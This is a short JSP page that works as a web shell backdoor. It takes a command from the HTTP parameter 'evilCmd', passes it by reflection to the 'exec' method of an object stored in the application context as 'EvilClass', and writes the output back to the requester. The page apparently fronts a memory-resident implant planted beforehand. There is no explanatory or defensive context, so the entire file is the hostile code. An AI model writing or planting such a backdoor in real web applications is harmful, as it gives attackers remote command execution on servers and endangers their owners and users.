<%@ page import="java.lang.reflect.Method" %>

<%
    String cmd = request.getParameter("evilCmd");
    if (cmd != null) {
        Object obj = application.getAttribute("EvilClass");
        if (obj != null) {
            try {
                Method exec = obj.getClass().getMethod("exec", String.class);
                out.print(exec.invoke(obj, cmd));
            } catch (Exception e) {
                out.print("Error executing command: " + e.getMessage());
            }
        }
    }
%>